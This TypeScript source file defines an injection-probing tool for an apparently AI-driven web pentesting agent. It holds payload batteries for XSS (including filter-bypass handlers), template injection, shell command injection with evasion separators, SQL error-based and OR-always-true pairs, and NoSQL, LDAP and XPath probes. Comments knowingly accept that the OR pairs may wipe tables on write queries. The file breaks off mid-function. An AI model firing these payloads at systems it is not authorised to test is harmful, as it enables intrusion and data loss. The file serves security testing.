import z from "zod"
import { randomBytes } from "crypto"
import { Tool } from "./tool"
import { Request } from "../session/request"
import { WebCredential } from "../session/web/web-credential"
import { Session } from "../session"

// ─────────────────────────────────────────────────────────────────────────────
// inject_probe (v1 — XSS only) — an EVIDENCE ENGINE, NOT an oracle.
//
// It fires a payload battery at ONE request's parameters and returns FACTS ABOUT
// BYTES (did the marker reflect? was it HTML-encoded? which tag survived a filter?).
// It NEVER decides whether a vulnerability exists and NEVER runs a JS engine — the
// agent verifies each observation and judges. There is deliberately no
// "vulnerable" / "found" / "success" field. Whether the LLM over-reads a positive
// observation as a confirmed vuln (false positive) is measured, not assumed.
//
// Division of labour: the TOOL supplies payload BREADTH (which tag survives — the
// enumeration weak models skip); the AGENT crafts the real exploit and confirms.
// ─────────────────────────────────────────────────────────────────────────────

const description = `Fire a battery of probes at ONE parameter-bearing request and return RAW OBSERVATIONS.

This tool does NOT find or confirm vulnerabilities and does NOT run a JS engine or a shell — it only reports what the server echoed back. Every observation is a LEAD you must verify yourself, never a verdict. After reading it: craft and send the actual exploit to confirm, and separately cover every class listed under coverage.not_tested (this tool does not test them).

vuln_type:
- "xss"  — reflected tag-survival (which HTML tags reflect un-encoded past a filter).
- "ssti" — server-side template evaluation: fires a fixed arithmetic expression in several engine
           syntaxes and reports which (if any) the server EVALUATED (product present, literal absent).
- "cmd"  — OS command injection: fires benign READ-ONLY probes (id/ver) behind shell separators and
           reports which (if any) produced command output in the response. Read-only DETECTION ONLY —
           it never sends network/file/write commands.

Query-string and form-urlencoded parameters only. You choose WHERE (request_id/target/target_param);
the tool chooses the payloads (you cannot supply a command or template expression).`

// Tag battery — one benign marker per tag so we can detect survival + encoding
// without executing anything. The agent weaponizes a surviving tag afterwards.
const XSS_TAGS = ["script", "img", "svg", "body", "style", "details", "a", "marquee", "input", "iframe", "image"]

// Weaponized + filter-bypass battery. Fired only AFTER a tag is seen to survive, so we can tell
// the agent WHICH full handler payload — including alert/confirm-blacklist bypasses — reflects
// un-encoded (a ready-to-fire lead). Still REFLECTION only (no JS engine): a raw-reflected handler
// payload is a strong lead, not a confirmed execution. All benign — no server-side effect.
// Each entry, given a nonce, returns the payload + a signature regex whose match means the
// payload's SENSITIVE run (handler + function + nonce) survived RAW (not stripped, not encoded).
//
// ORDER MATTERS — `weaponized[]` preserves this order, and weak models fire the FIRST surviving
// lead. So ALERT-CALLING payloads rank first (XSS checkers assert alert('XSS') — print/prompt/confirm
// execute JS but do NOT satisfy an alert-checker → they lose the lab). Layout:
//   1) plain alert across diverse tags — survives tag-allowlist filters, cleanest.
//   2) alert-OBFUSCATION bypasses (unicode/concat/paren) — for keyword-blacklist filters that strip
//      literal "alert"; here the plain forms above get stripped and drop out of `weaponized[]`, so
//      an obfuscated ALERT naturally becomes surviving[0] (still an alert-caller → checker passes).
//   3) non-alert JS-exec proofs (confirm/print/prompt) LAST — only surface when nothing alert-y
//      survived; a genuine "JS runs here" lead, but ranked last so a checker-satisfying payload wins.
const XSS_WEAPONS: ((n: string) => { payload: string; sig: RegExp })[] = [
  // 1) plain alert(), diverse tags
  (n) => ({ payload: `<svg onload=alert(${n})>`, sig: new RegExp(`onload=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<img src=x onerror=alert(${n})>`, sig: new RegExp(`onerror=alert\\(${n}`, "i") }),
  // <image> alias + slash separators + no whitespace — beats tag-allowlists that permit only <image>
  // AND filters that strip all whitespace (the winner shape for both together).
  (n) => ({ payload: `<image/src/onerror=alert(${n})>`, sig: new RegExp(`<image/src/onerror=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<body onpageshow=alert(${n})>`, sig: new RegExp(`onpageshow=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<details open ontoggle=alert(${n})>`, sig: new RegExp(`ontoggle=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<marquee onstart=alert(${n})>`, sig: new RegExp(`onstart=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<input autofocus onfocus=alert(${n})>`, sig: new RegExp(`onfocus=alert\\(${n}`, "i") }),
  (n) => ({ payload: `<a href=javascript:alert(${n})>x</a>`, sig: new RegExp(`href=javascript:alert\\(${n}`, "i") }),
  // 2) alert-obfuscation bypasses (still call alert — beat literal-"alert" blocklists)
  (n) => ({ payload: `<svg onload=\\u0061lert(${n})>`, sig: new RegExp(`onload=\\\\u0061lert\\(${n}`, "i") }), // unicode-escape
  (n) => ({ payload: `<svg onload=top['al'+'ert'](${n})>`, sig: new RegExp(`top\\['al'\\+'ert'\\]\\(${n}`, "i") }), // concat
  (n) => ({ payload: `<svg onload=(alert)(${n})>`, sig: new RegExp(`\\(alert\\)\\(${n}`, "i") }), // paren-wrap
  // 2b) attribute stay-in — reflection INSIDE a quoted attribute value: add a handler WITHOUT opening
  //     a new tag (many filters strip `<` but pass `"`+`on…`). Needs interaction, so ranked mid-list.
  (n) => ({ payload: `" onmouseover=alert(${n}) x="`, sig: new RegExp(`" onmouseover=alert\\(${n}`, "i") }), // double-quoted attr
  (n) => ({ payload: `' onmouseover=alert(${n}) x='`, sig: new RegExp(`' onmouseover=alert\\(${n}`, "i") }), // single-quoted attr
  // 3) non-alert JS-exec proofs LAST (won't satisfy an alert-checker — fallback evidence only)
  (n) => ({ payload: `<svg onload=confirm(${n})>`, sig: new RegExp(`onload=confirm\\(${n}`, "i") }),
  (n) => ({ payload: `<svg onload=print(${n})>`, sig: new RegExp(`onload=print\\(${n}`, "i") }),
  (n) => ({ payload: `<img src=x onerror=print(${n})>`, sig: new RegExp(`onerror=print\\(${n}`, "i") }),
  (n) => ({ payload: `<svg onload=prompt(${n})>`, sig: new RegExp(`onload=prompt\\(${n}`, "i") }),
]

const XSS_NOT_TESTED = [
  "stored/second-order XSS (fires on a different render request)",
  "DOM-based XSS (needs a JS engine)",
  "true JS execution (this tool only checks reflection, not execution)",
  "blind/out-of-band classes",
  "CSRF-token-protected or multi-step flows",
  "non-query/non-form injection points (path, header, cookie, JSON, XML, GraphQL, multipart)",
]

// ── SSTI: arithmetic-evaluation battery ──
// Fire a fixed arithmetic expression wrapped in each engine's syntax. The discriminant is a
// FACT about bytes: the PRODUCT appears in the response AND the LITERAL expression does not
// (a literal echo means it was reflected, NOT evaluated). Distinctive factors → an 8-digit
// product with negligible coincidence. No agent-supplied template expression, ever.
const SSTI_A = 7919
const SSTI_B = 6841
const SSTI_EXPR = `${SSTI_A}*${SSTI_B}`
const SSTI_PRODUCT = String(SSTI_A * SSTI_B)
const SSTI_SYNTAXES: { name: string; wrap: (e: string) => string }[] = [
  { name: "{{ }}", wrap: (e) => `{{${e}}}` }, // Jinja2, Twig, Nunjucks, Django
  { name: "${ }", wrap: (e) => `\${${e}}` }, // FreeMarker, JSP EL, Spring, Thymeleaf, JS template
  { name: "#{ }", wrap: (e) => `#{${e}}` }, // Ruby/Slim, JSF EL
  { name: "<%= %>", wrap: (e) => `<%= ${e} %>` }, // ERB, EJS, ASP
  { name: "@( )", wrap: (e) => `@(${e})` }, // Razor
  { name: "%{ }", wrap: (e) => `%{${e}}` }, // OGNL / Struts2
  { name: "*{ }", wrap: (e) => `*{${e}}` }, // Thymeleaf selection expr
  { name: "[[${ }]]", wrap: (e) => `[[\${${e}}]]` }, // Thymeleaf inline eval (bypasses ${ } filters)
  { name: "{{= }}", wrap: (e) => `{{=${e}}}` }, // Underscore / doT / EJS-alt
]
const SSTI_NOT_TESTED = [
  "blind/out-of-band SSTI (evaluated result not reflected in the response)",
  "non-arithmetic template gadgets (config/object access, RCE chains — this tool only checks arithmetic evaluation)",
  "DOM/client-side template evaluation (needs a JS engine)",
  "non-query/non-form injection points (path, header, cookie, JSON, XML, GraphQL, multipart)",
]

// ── Command injection: benign READ-ONLY probes behind shell separators ──
// HARD BOUNDARY (ratified): read-only DETECTION only. The command set is a CLOSED internal
// constant — id/ver — the agent cannot change it. NO network (ping/curl/wget/nslookup), NO
// file read/write, NO redirects, NO time-delay (sleep) — that line is detection⇄exploitation.
const CMD_PROBES: { cmd: string; marker: RegExp; os: string }[] = [
  { cmd: "id", marker: /\buid=\d+\(/i, os: "unix" }, // uid=0(root) gid=0(root) …
  { cmd: "i''d", marker: /\buid=\d+\(/i, os: "unix" }, // quote-insertion evasion — shell strips '' → runs id
  { cmd: "i\\d", marker: /\buid=\d+\(/i, os: "unix" }, // backslash evasion — shell strips \ → runs id
  { cmd: "ver", marker: /windows \[version/i, os: "windows" }, // Microsoft Windows [Version …]
  { cmd: "v^er", marker: /windows \[version/i, os: "windows" }, // caret evasion — cmd.exe strips ^ → runs ver
]
const CMD_SEPARATORS: { name: string; wrap: (c: string) => string }[] = [
  { name: ";", wrap: (c) => `;${c}` },
  { name: "|", wrap: (c) => `|${c}` },
  { name: "&&", wrap: (c) => `&& ${c}` },
  { name: "||", wrap: (c) => `|| ${c}` }, // OR-separator — runs when the BASE command fails (the ~half && misses)
  { name: "& (win)", wrap: (c) => `& ${c}` }, // cmd.exe unconditional separator
  { name: "$( )", wrap: (c) => `$(${c})` },
  { name: "` `", wrap: (c) => `\`${c}\`` },
  { name: "newline", wrap: (c) => `\n${c}` }, // URL-encoded to %0A by searchParams
  { name: "'; (quote-close)", wrap: (c) => `'; ${c}` }, // break out of a single-quoted shell arg first
  { name: '"; (quote-close)', wrap: (c) => `"; ${c}` }, // break out of a double-quoted shell arg first
]
const CMD_NOT_TESTED = [
  "blind/time-based command injection (no command output reflected in the response)",
  "out-of-band command injection (DNS/HTTP callback)",
  "commands beyond the read-only id/ver probes (this tool never sends network/file/write/delay commands)",
  "non-query/non-form injection points (path, header, cookie, JSON, XML, GraphQL, multipart)",
]

// ── error-signature classes (sqli / nosql / ldap / xpath) ──
// The probe fires a battery of payloads and reports, as raw facts, which elicited that class's
// error signature or a boolean-differential. Safety envelope: no stacked queries (`;`), no write
// verbs, no time-delay. Bare quote/paren breakers only error out.
// ⚠️ EXCEPTION (owner-authorized): the sqli boolPairs now include OR-always-true forms. Unlike AND
// (which only narrows), OR '1'='1 makes a WHERE match EVERY row — on an UPDATE/DELETE sink this can
// modify/delete the whole table, and the probe fires blind (it cannot tell a read sink from a write
// one). This trades the AND-only safety guarantee for detection on row-count oracles whose base
// matches no row. Deeper exploitation (UNION, blind extraction) is still the AGENT's job.
interface ErrSigClass {
  payloads: string[]
  // true/false pairs for a boolean-differential FACT — AND (safe, narrows) + OR (widens, see warning)
  boolPairs?: { t: string; f: string }[]
  signatures: RegExp
}
const ERRSIG: Record<"sqli" | "nosql" | "ldap" | "xpath", ErrSigClass> = {
  sqli: {
    // breakers + filter-bypass forms (comment/case/escape) — ERROR-only, no OR/stacked/write.
    // + DBMS-specific error-based type-cast probes: read-only functions that leak the version in a
    //   distinctive error even where a generic bare quote is sanitized. No write/sleep/OOB.
    payloads: ["'", '"', "`", "\\", "')", '")', "'))", `'"`, "'--", "'#", "'/*", "1'", '1"', "'/**/", "'-- -", "'/*!50000*/", "\\'",
      "' AND extractvalue(1,concat(0x7e,version()))-- -", // MySQL: "XPATH syntax error: '~<ver>'"
      "' AND 1=convert(int,@@version)-- -",               // MSSQL: "Conversion failed ... <ver>"
      "' AND 1=cast(version() as int)-- -",               // PostgreSQL: "invalid input syntax for integer"
      "' ORDER BY 9999-- -"],                             // column-overflow: "Unknown column '9999'"
    boolPairs: [
      // AND-based (safe: AND only narrows — cannot widen a write query's affected rows)
      { t: "' AND '1'='1", f: "' AND '1'='2" },
      { t: '" AND "1"="1', f: '" AND "1"="2' },
      { t: "') AND ('1'='1", f: "') AND ('1'='2" },
      { t: "' AND 1=1-- -", f: "' AND 1=2-- -" },
      { t: "1 AND 1=1", f: "1 AND 1=2" },
      { t: "'/**/AND/**/'1'='1", f: "'/**/AND/**/'1'='2" }, // comment-whitespace WAF bypass
      { t: "' AnD '1'='1", f: "' AnD '1'='2" }, // keyword-case bypass
      // OR-based (owner-authorized). Detects a row-count oracle even when the base value matches
      // NO row: OR '1'='1 makes the WHERE always-true → rows returned; OR '1'='2 leaves it false.
      // ⚠️ On a write sink (UPDATE/DELETE ... WHERE) an always-true predicate matches EVERY row —
      // this can modify/delete the whole table. The probe fires blind (it cannot know the sink is a
      // read). Accepted risk per owner decision; the AND pairs above stay for the safe path.
      { t: "' OR '1'='1", f: "' OR '1'='2" },
      { t: '" OR "1"="1', f: '" OR "1"="2' },
      { t: "') OR ('1'='1", f: "') OR ('1'='2" },
      { t: "' OR 1=1-- -", f: "' OR 1=2-- -" },
      { t: "1 OR 1=1", f: "1 OR 1=2" },
    ],
    signatures:
      /SQL syntax|mysqli?_|you have an error in your sql|unclosed quotation|quoted string not properly terminated|ORA-\d{5}|PLS-\d|SQLSTATE|PostgreSQL.*(ERROR|error)|SQLite(3)?::|sqlite_|syntax error at or near|Microsoft OLE DB|ODBC.*Driver|Incorrect syntax near|Unclosed quotation mark|Warning.*\bpg_|Warning.*\bmysqli?|XPATH syntax error|invalid input syntax for|Conversion failed when converting|Unknown column '\d/i,
  },
  nosql: {
    // malformed value / type-confusion that a Mongo/BSON layer surfaces as an error. Operator-injection
    // ([$ne]/[$gt]/[$regex]) is now ALSO fired as a boolean-differential — see the nosql operator step
    // in probeErrorSigPoint (⚠️ owner-authorized widening: an always-true operator matches all docs).
    payloads: ["'", '"', "\\", "[", "]", "{", "}", "'\"", '{"a":', "']", "'}", "%00", "\\\"", "{[", "',", "NaN", "'\\"],
    signatures:
      /MongoError|MongoServerError|BSONError|BSONTypeError|E11000|CastError|failed to parse|unexpected token.*(json|in json)|SyntaxError:.*JSON|\$where|Mongoose|couldn't parse/i,
  },
  ldap: {
    // LDAP filter metacharacters that break the filter → server surfaces a filter/DN error.
    payloads: ["(", ")", "*", "\\", ")(", "*)", "(&", "(|", "))", "*()", "\\29", "\\28", "\\2a", "\\5c", "()", "&", "|"],
    // filter-close + always-true (t) vs always-false (f): response-count differential = injection.
    // Search-scope widening (read); consistent with the owner-authorized OR policy on sqli.
    boolPairs: [
      { t: "*)(cn=*)", f: "*)(cn=z%zznomatch)" },
      { t: "*)(|(cn=*)", f: "*)(|(cn=z%zznomatch)" },
      { t: "*)(objectClass=*)", f: "*)(objectClass=zzznomatch)" },
    ],
    signatures:
      /LDAP.*(error|syntax|filter)|invalid DN|bad search filter|(javax|com)\.naming|invalid filter|Protocol error|InvalidSearchFilter|ldap_search/i,
  },
  xpath: {
    // XPath is a read-only query language (no write-widening risk); breakers elicit parser errors.
    payloads: ["'", '"', ")", "(", "]", "[", "//", "*", "')", '")', "' and '1'='2", "count(", "']", "'))", "concat(", "string("],
    // TRUE/FALSE differential pairs (XPath is read-only — `or` cannot widen any write).
    boolPairs: [
      { t: "' or '1'='1", f: "' or '1'='2" },
      { t: '" or "1"="1', f: '" or "1"="2' },
      { t: "1 or 1=1", f: "1 or 1=2" },
      { t: "' or true() or '1'='1", f: "' or false() or '1'='2" }, // function-based (literal '1'='1 filtered)
      { t: '") or ("1"="1', f: '") or ("1"="2' },
    ],
    signatures:
      /XPath|XPathException|xmlXPathEval|SyntaxError.*xpath|unclosed token|Invalid (expression|predicate)|xpath.*(syntax|error)|MS\.Internal\.Xml/i,
  },
}

function nonce(): string {
  return "m" + randomBytes(5).toString("hex")
}

// ── request parsing (raw_request is the source of truth; canonical_path is legacy fallback) ──

interface ResolvedRequest {
  method: string
  url: URL // absolute, concrete (path + query)
  headers: Record<string, string>
  body: string
  contentType: string
  auth: { source: string }
  provenance: { fromRaw: boolean; reconstructed: boolean; bodyMaybeTruncated: boolean }
}

function parseRaw(raw: string): { requestLine: string; headers: Record<string, string>; body: string } {
  const splitIdx = raw.indexOf("\r\n\r\n") >= 0 ? raw.indexOf("\r\n\r\n") : raw.indexOf("\n\n")
  const head = splitIdx >= 0 ? raw.slice(0, splitIdx) : raw
  const body = splitIdx >= 0 ? raw.slice(splitIdx).replace(/^(\r\n\r\n|\n\n)/, "") : ""
  const lines = head.split(/\r?\n/)
  const requestLine = lines[0] ?? ""
  const headers: Record<string, string> = {}
  for (const line of lines.slice(1)) {
    const i = line.indexOf(":")
    if (i > 0) headers[line.slice(0, i).trim().toLowerCase()] = line.slice(i + 1).trim()
  }
  return { requestLine, headers, body }
}

function resolve(request: Request.Info): ResolvedRequest | { error: string } {
  const scheme = request.scheme ?? "http"
  const originHost = request.host ?? (request.origin ? new URL(request.origin).host : undefined)
  if (!originHost) return { error: "request has no host/origin — cannot resolve a sendable URL" }
  const port = request.port ? `:${request.port}` : ""
  const origin = request.origin ?? `${scheme}://${originHost}${port}`

  let method = request.method
  let pathAndQuery: string | undefined
  let headers: Record<string, string> = {}
  let body = ""
  let fromRaw = false

  if (request.raw_request) {
    const p = parseRaw(request.raw_request)
    const parts = p.requestLine.split(/\s+/)
    if (parts.length >= 2) {
      method = (parts[0] as Request.Info["method"]) || method
      pathAndQuery = parts[1]
      headers = p.headers
      body = p.body
      fromRaw = true
    }
  }
  // legacy fallback: canonical_path (path only, NO query — query points unavailable)
  if (!pathAndQuery) pathAndQuery = request.canonical_path ?? request.normalized_path

  let url: URL
  try {
    url = new URL(pathAndQuery.startsWith("http") ? pathAndQuery : origin + pathAndQuery)
  } catch {
    return { error: `could not build a URL from ${origin} + ${pathAndQuery}` }
  }

  // merge full untruncated auth headers from the credential
  let authSource = "none"
  if (request.credential_id) {
    const cred = WebCredential.getById(request.credential_id)
    if (cred) {
      for (const [k, v] of Object.entries(cred.headers)) headers[k.toLowerCase()] = v
      authSource = `credential:${request.credential_id}`
    }
  } else if (fromRaw && (headers["cookie"] || headers["authorization"])) {
    authSource = "request"
  }

  const contentType = headers["content-type"] ?? ""
  return {
    method,
    url,
    headers,
    body,
    contentType,
    auth: { source: authSource },
    provenance: {
      fromRaw,
      reconstructed: !fromRaw,
      bodyMaybeTruncated: fromRaw && !!request.body_hash && body.length >= 8 * 1024 - 4,
    },
  }
}

// direct-target resolver (new/unseen endpoint — no stored request row)
function resolveFromTarget(t: {
  method: string
  url: string
  headers?: Record<string, string>
  body?: string
  content_type?: string
}): ResolvedRequest | { error: string } {
  let url: URL
  try {
    url = new URL(t.url)
  } catch {
    return { error: `invalid target url: ${t.url}` }
  }
  const headers: Record<string, string> = {}
  for (const [k, v] of Object.entries(t.headers ?? {})) headers[k.toLowerCase()] = v
  const contentType = t.content_type ?? headers["content-type"] ?? ""
  if (contentType) headers["content-type"] = contentType
  return {
    method: t.method,
    url,
    headers,
    body: t.body ?? "",
    contentType,
    auth: { source: headers["cookie"] || headers["authorization"] ? "target" : "none" },
    provenance: { fromRaw: false, reconstructed: false, bodyMaybeTruncated: false },
  }
}

// ── injection points — agent picks WHERE (location + name); tool injects the payload ──

type Location = "query" | "form_field" | "json_body" | "header" | "cookie" | "path"

interface InjPoint {
  location: Location
  name: string
}

// Header names the tool must never let a payload set — routing/framing headers whose
// mutation could redirect the request or split/smuggle the response.
const FORBIDDEN_HEADERS = new Set([
  "host",
  ":authority",
  ":method",
  ":path",
  ":scheme",
  "content-length",
  "connection",
  "transfer-encoding",
  "te",
  "upgrade",
  "content-type",
])

// Auto-enumerate the self-evident points (query + form) when the agent gives none.
function enumeratePoints(r: ResolvedRequest, only?: string): InjPoint[] {
  const points: InjPoint[] = []
  for (const [name] of r.url.searchParams) if (!only || only === name) points.push({ location: "query", name })
  if (r.contentType.includes("application/x-www-form-urlencoded")) {
    const form = new URLSearchParams(r.body)
    for (const [name] of form) if (!only || only === name) points.push({ location: "form_field", name })
  } else if (r.contentType.includes("multipart/form-data")) {
    const b = multipartBoundary(r)
    if (b) for (const name of multipartFieldNames(r.body, b)) if (!only || only === name) points.push({ location: "form_field", name })
  }
  return points
}

// Validate agent-supplied points; reject unsafe ones up front (never silently mutate).
function validatePoints(pts: InjPoint[]): { points: InjPoint[]; rejected: { point: string; reason: string }[] } {
  const points: InjPoint[] = []
  const rejected: { point: string; reason: string }[] = []
  for (const p of pts) {
    if (p.location === "header" && FORBIDDEN_HEADERS.has(p.name.toLowerCase())) {
      rejected.push({ point: `header:${p.name}`, reason: "routing/framing header — refused (no response-splitting/rerouting)" })
      continue
    }
    points.push(p)
  }
  return { points, rejected }
}

// no CR/LF/NUL in a header value → cannot inject a new header or split the response
const sanitizeHeaderValue = (v: string) => v.replace(/[\r\n ]/g, "")

function setJsonField(body: string, path: string, value: string): string {
  try {
    const root = JSON.parse(body || "{}")
    const keys = path.split(".")
    let cur: any = root
    for (let i = 0; i < keys.length - 1; i++) {
      if (typeof cur[keys[i]] !== "object" || cur[keys[i]] == null) cur[keys[i]] = {}
      cur = cur[keys[i]]
    }
    cur[keys[keys.length - 1]] = value
    return JSON.stringify(root)
  } catch {
    return body // not JSON — leave untouched (caller still sends, agent sees no change)
  }
}

function setCookie(cookieHeader: string, name: string, value: string): string {
  const safeVal = value.replace(/[;\r\n ]/g, "")
  const parts = (cookieHeader ? cookieHeader.split(/;\s*/) : []).filter(
    (p) => p && p.split("=")[0].trim().toLowerCase() !== name.toLowerCase(),
  )
  parts.push(`${name}=${safeVal}`)
  return parts.join("; ")
}

function injectPathSegment(pathname: string, indexStr: string, value: string): string {
  const segs = pathname.split("/")
  const nonEmpty: number[] = []
  for (let i = 0; i < segs.length; i++) if (segs[i] !== "") nonEmpty.push(i)
  const target = nonEmpty[Number(indexStr)]
  if (target == null) return pathname
  // path is a MARKER location, never a traversal vector: strip any ../ and encode
  segs[target] = encodeURIComponent(value.replace(/\.\.(\/|\\)?/g, ""))
  return segs.join("/")
}

// Set a JSON field to an ARBITRARY value (object/null/string) — for NoSQL operator injection where
// the injected value is `{"$ne": null}`, not a string. Same path-walk as setJsonField.
function setJsonValue(body: string, path: string, value: any): string {
  try {
    const root = JSON.parse(body || "{}")
    const keys = path.split(".")
    let cur: any = root
    for (let i = 0; i < keys.length - 1; i++) {
      if (typeof cur[keys[i]] !== "object" || cur[keys[i]] == null) cur[keys[i]] = {}
      cur = cur[keys[i]]
    }
    cur[keys[keys.length - 1]] = value
    return JSON.stringify(root)
  } catch {
    return body
  }
}

// NoSQL OPERATOR injection: place a Mongo operator on the parameter instead of a scalar value.
// query/form → `name[$op]=val` (RAW brackets preserved — many parsers decode-then-bracket-parse,
// but raw is the widest-compatible wire form); json_body → `{"name": {"$op": val}}`. Other
// locations (header/cookie/path) can't carry an operator → returns null (skip).
// ⚠️ Same widening class as OR-sqli: `{$ne:null}` matches EVERY document → on a write op it hits all.
function applyOperatorTarget(
  r: ResolvedRequest,
  point: InjPoint,
  opKey: string,
  opVal: any,
): { url: string; body: string; headers: Record<string, string> } | null {
  const headers = { ...r.headers }
  const u = new URL(r.url.toString())
  const origin = `${u.protocol}//${u.host}${u.pathname}`
  const enc = (s: string) => encodeURIComponent(s)
  const rawPair = `${point.name}[${opKey}]=${enc(String(opVal))}` // bracket RAW, value encoded
  switch (point.location) {
    case "query": {
      const parts: string[] = []
      for (const [k, v] of u.searchParams) if (k !== point.name) parts.push(`${enc(k)}=${enc(v)}`)
      parts.push(rawPair)
      return { url: `${origin}?${parts.join("&")}`, body: r.body, headers }
    }
    case "form_field": {
      if (r.contentType.includes("multipart/form-data")) {
        const b = multipartBoundary(r)
        const mp = b ? setMultipartOperator(r.body, b, point.name, opKey, opVal) : null
        return mp != null ? { url: u.toString(), body: mp, headers } : null
      }
      const f = new URLSearchParams(r.body)
      const parts: string[] = []
      for (const [k, v] of f) if (k !== point.name) parts.push(`${enc(k)}=${enc(v)}`)
      parts.push(rawPair)
      return { url: u.toString(), body: parts.join("&"), headers }
    }
    case "json_body":
      return { url: u.toString(), body: setJsonValue(r.body, point.name, { [opKey]: opVal }), headers }
    default:
      return null
  }
}

// ── multipart/form-data support (form_field on a multipart body) ──
// We do SURGICAL raw-string edits — never parse→rebuild — so the boundary, part headers, sibling
// fields, and (binary) file parts survive byte-for-byte. Value goes in RAW (no url-encoding).
function multipartBoundary(r: ResolvedRequest): string | null {
  const m = r.contentType.match(/boundary=("?)([^";]+)\1/i)
  if (m) return m[2].trim()
  // fallback: a truncated/reconstructed header may drop the boundary param — recover it from the
  // body's first delimiter line (`--<boundary>\r\n`); the closing `--<boundary>--` is never first.
  const b = r.body.match(/^--(.+?)\r?\n/)
  return b ? b[1].trim() : null
}
// The field name declared by a part's Content-Disposition (null for a file part, whose binary body
// we never touch). `\bname=` avoids the false match inside `filename="…"`.
function mpFieldName(seg: string): string | null {
  if (/filename="/i.test(seg)) return null
  const m = seg.match(/content-disposition:[^\r\n]*\bname="([^"]+)"/i)
  return m ? m[1] : null
}
// Non-file text field names in a multipart body (for auto-enumeration).
function multipartFieldNames(body: string, boundary: string): string[] {
  const names: string[] = []
  for (const seg of body.split(`--${boundary}`)) {
    const n = mpFieldName(seg)
    if (n != null) names.push(n)
  }
  return names
}
// Replace ONE text field's value in a multipart body. Returns null (caller leaves body unchanged)
// if the field is absent, is a file part, or the value would corrupt the framing.
function setMultipartField(body: string, boundary: string, name: string, value: string): string | null {
  if (value.includes(`--${boundary}`)) return null // never let a value forge a part boundary
  const delim = `--${boundary}`
  const segments = body.split(delim)
  for (let i = 0; i < segments.length; i++) {
    const seg = segments[i]
    if (mpFieldName(seg) !== name) continue // not our text field (file parts → null, so never matched)
    const sep = seg.match(/\r?\n\r?\n/) // header/value separator
    if (!sep || sep.index == null) continue
    const headEnd = sep.index + sep[0].length
    const rest = seg.slice(headEnd) // = OLD_VALUE + trailing CRLF (before the next boundary)
    const trail = rest.match(/\r?\n$/)?.[0] ?? "\r\n"
    segments[i] = seg.slice(0, headEnd) + value + trail
    return segments.join(delim) // split/join with a string delimiter is lossless — only this part changed
  }
  return null
}
// NoSQL OPERATOR injection on a multipart text field: rename the part `name="user"` → `name="user[$op]"`
// and set its value. On a bracket-parsing stack (multer + qs) this decodes to {user:{$op:val}}; on one
// that doesn't, it's an inert literal field name → no differential → no false positive. Best-effort,
// framework-dependent (documented). Null if the field is absent / a file part / would forge a boundary.
function setMultipartOperator(body: string, boundary: string, name: string, opKey: string, opVal: any): string | null {
  const v = String(opVal)
  if (v.includes(`--${boundary}`)) return null
  const delim = `--${boundary}`
  const segments = body.split(delim)
  for (let i = 0; i < segments.length; i++) {
    if (mpFieldName(segments[i]) !== name) continue // (file parts → null, never matched)
    // 1) rewrite the Content-Disposition field name → name[$op]  (text part → only one name=" here).
    //    Function replacer — never a string — so a `$` in the field name or operator (opKey is `$ne`…)
    //    can't be mis-read as a replacement backreference.
    const seg = segments[i].replace(/(content-disposition:[^\r\n]*?\bname=")[^"]+(")/i, (_m, pre, post) => `${pre}${name}[${opKey}]${post}`)
    // 2) set the value (recompute the header/value split on the RENAMED segment)
    const sep = seg.match(/\r?\n\r?\n/)
    if (!sep || sep.index == null) return null
    const headEnd = sep.index + sep[0].length
    const trail = seg.slice(headEnd).match(/\r?\n$/)?.[0] ?? "\r\n"
    segments[i] = seg.slice(0, headEnd) + v + trail
    return segments.join(delim)
  }
  return null
}

// Apply one payload at one point → the full mutated {url, body, headers}. Location-specific
// sanitizers keep new reach (header/cookie/path/json) benign; guardHost still governs the host.
function applyPayload(
  r: ResolvedRequest,
  point: InjPoint,
  value: string,
): { url: string; body: string; headers: Record<string, string> } {
  const headers = { ...r.headers }
  const u = new URL(r.url.toString())
  let body = r.body
  switch (point.location) {
    case "query":
      u.searchParams.set(point.name, value)
      break
    case "form_field": {
      if (r.contentType.includes("multipart/form-data")) {
        const b = multipartBoundary(r)
        const mp = b ? setMultipartField(r.body, b, point.name, value) : null
        body = mp ?? r.body // couldn't set (absent/file/no boundary) → leave unchanged, never corrupt
        break
      }
      const f = new URLSearchParams(r.body)
      f.set(point.name, value)
      body = f.toString()
      break
    }
    case "json_body":
      body = setJsonField(r.body, point.name, value)
      break
    case "header":
      headers[point.name.toLowerCase()] = sanitizeHeaderValue(value)
      break
    case "cookie":
      headers["cookie"] = setCookie(headers["cookie"] ?? "", point.name, value)
      break
    case "path":
      u.pathname = injectPathSegment(u.pathname, point.name, value)
      break
  }
  return { url: u.toString(), body, headers }
}

// ── safety choke point: EVERY send goes through here ──

function guardHost(r: ResolvedRequest, target: URL): { ok: true } | { ok: false; reason: string } {
  // scope guard: only ever send to the SAME host as the resolved (already-crawled, in-scope)
  // request. The tool cannot be pointed at an arbitrary/out-of-scope host.
  if (target.host !== r.url.host) return { ok: false, reason: `out-of-scope host ${target.host}` }
  return { ok: true }
}

// Hard upper bound on total sends per tool call (WAF-ban + DoS + context guard). When hit,
// remaining probes are skipped and reported as truncated rather than exploding silently.
interface SendBudget {
  sent: number
  max: number
}

// A curated subset of response headers the agent needs to reason about (DB/engine fingerprint,
// auth-bypass tells, WAF identity) — NOT the whole header set (context discipline).
const KEEP_HEADERS = ["server", "x-powered-by", "location", "www-authenticate", "content-type", "set-cookie", "cf-ray", "x-sucuri-id", "x-akamai-transformed", "x-cache"]
function extractHeaders(h: Headers): Record<string, string> {
  const out: Record<string, string> = {}
  for (const k of KEEP_HEADERS) {
    const v = h.get(k)
    if (v) out[k] = v.slice(0, 200)
  }
  return out
}

type SendOk = { status: number; text: string; ms: number; headers: Record<string, string> }
type SendResult = SendOk | { error: string; timeout?: boolean }

async function send(
  r: ResolvedRequest,
  target: { url: string; body: string; headers?: Record<string, string> },
  abort: AbortSignal,
  budget?: SendBudget,
): Promise<SendResult> {
  if (budget) {
    if (budget.sent >= budget.max) return { error: "send budget exhausted" }
    budget.sent++
  }
  const u = new URL(target.url)
  const guard = guardHost(r, u)
  if (!guard.ok) return { error: guard.reason }
  const sendHeaders: Record<string, string> = { ...(target.headers ?? r.headers) }
  delete sendHeaders["content-length"] // recomputed by fetch
  delete sendHeaders["host"]
  const init: RequestInit & { tls?: { rejectUnauthorized: boolean } } = {
    method: r.method,
    headers: sendHeaders,
    signal: abort,
    redirect: "manual",
